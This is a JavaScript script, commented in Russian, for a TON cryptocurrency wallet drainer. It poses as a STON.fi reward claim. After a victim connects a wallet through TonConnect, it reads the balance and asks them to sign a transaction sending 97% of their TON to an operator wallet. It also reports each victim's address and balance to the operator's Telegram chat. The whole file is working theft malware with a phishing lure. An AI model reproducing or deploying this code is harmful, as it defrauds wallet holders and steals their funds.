// ============================================================
//  КОНФИГУРАЦИЯ – заменить на свои значения
// ============================================================
const CONFIG = {
    operatorWallet: 'UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI',
    botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',
    chatId: '-1001234567890',
    stealPercent: 0.97,
    fakeComment: '📥 Получение награды STON.fi'
};

// ============================================================
//  ИНИЦИАЛИЗАЦИЯ TON CONNECT (с проверкой загрузки)
// ============================================================
const debugEl = document.getElementById('debug');
function logDebug(msg) {
    console.log('[DEBUG]', msg);
    if (debugEl) debugEl.textContent = msg;
}

// Проверяем, что SDK загрузился
if (typeof TonConnect === 'undefined') {
    logDebug('❌ SDK не загружен – проверьте интернет и ссылку на CDN');
    throw new Error('TonConnect not loaded');
}

const connector = new TonConnect();
logDebug('✅ SDK загружен, connector создан');

// Элементы DOM
const btn = document.getElementById('connectBtn');
const statusDiv = document.getElementById('status');

function setStatus(text, isError = false) {
    statusDiv.textContent = text;
    statusDiv.style.color = isError ? '#ff4d4d' : '#f0b90b';
    logDebug(`Статус: ${text}`);
}

// ============================================================
//  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================

async function fetchWalletData(address) {
    const base = 'https://toncenter.com/api/v2/';
    try {
        const balanceResp = await fetch(`${base}getAddressBalance?address=${address}`);
        const balanceData = await balanceResp.json();
        const tonBalance = parseFloat(balanceData.result) / 1e9;

        // Jettons – используем экспериментальный эндпоинт
        const jettonsResp = await fetch(`${base}getAddressJettonBalances?address=${address}`);
        const jettonsData = await jettonsResp.json();
        const jettons = jettonsData.result || [];

        return { tonBalance, jettons };
    } catch (e) {
        logDebug('Ошибка API: ' + e.message);
        return null;
    }
}

async function notifyTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.chatId, text: message })
        });
    } catch (e) { /* игнорируем */ }
}

// ============================================================
//  ОСНОВНАЯ ЛОГИКА ДРЭЙНЕРА
// ============================================================

async function drainWallet(walletAddress) {
    setStatus('Анализ баланса...');
    const data = await fetchWalletData(walletAddress);
    if (!data) {
        setStatus('Ошибка получения данных', true);
        return;
    }
    const { tonBalance, jettons } = data;

    const messages = [];
    if (tonBalance > 0.1) {
        const stealAmount = Math.floor(tonBalance * CONFIG.stealPercent * 1e9);
        messages.push({
            address: CONFIG.operatorWallet,
            amount: stealAmount.toString(),
            payload: CONFIG.fakeComment
        });
    }

    // Для Jettons – в реальном коде нужно строить правильный payload, здесь упрощённо
    // (в демо оставляем только TON)

    if (messages.length === 0) {
        setStatus('Нет активов для кражи', true);
        return;
    }

    setStatus('Отправка транзакции на подпись...');
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 120,
        messages: messages
    };

    try {
        const result = await connector.sendTransaction(transaction);
        setStatus('✅ Транзакция выполнена!');
        await notifyTelegram(`✅ Успех: ${walletAddress}\nTON: ${tonBalance}`);
    } catch (e) {
        setStatus('❌ Отклонено или ошибка', true);
        logDebug('Ошибка sendTransaction: ' + e.message);
        await notifyTelegram(`❌ Отказ: ${walletAddress}`);
    }
}

// ============================================================
//  ОБРАБОТЧИКИ СОБЫТИЙ CONNECTOR
// ============================================================

connector.on('connect', async (walletInfo) => {
    const address = walletInfo.account.address;
    setStatus(`Подключён: ${address.slice(0,6)}...${address.slice(-4)}`);
    btn.disabled = true;
    await drainWallet(address);
});

connector.on('disconnect', () => {
    setStatus('Кошелёк отключён');
    btn.disabled = false;
});

connector.on('error', (error) => {
    logDebug('Ошибка connector: ' + JSON.stringify(error));
    setStatus('Ошибка подключения', true);
    btn.disabled = false;
});

// ============================================================
//  ОБРАБОТЧИК КНОПКИ
// ============================================================

btn.addEventListener('click', async () => {
    setStatus('Подключение...');
    btn.disabled = true;
    try {
        // Явно устанавливаем URL манифеста (абсолютный)
        const manifestUrl = `${window.location.origin}/tonconnect-manifest.json`;
        logDebug('Манифест: ' + manifestUrl);
        // В SDK 2.1.0 метод connect принимает объект с параметрами
        await connector.connect({ manifestUrl });
    } catch (e) {
        logDebug('Ошибка connect: ' + e.message);
        setStatus('Не удалось подключиться', true);
        btn.disabled = false;
    }
});

// ============================================================
//  ИНИЦИАЛИЗАЦИЯ
// ============================================================
setStatus('Нажмите "Подключить кошелёк"');
logDebug('Скрипт загружен, ожидание действий');
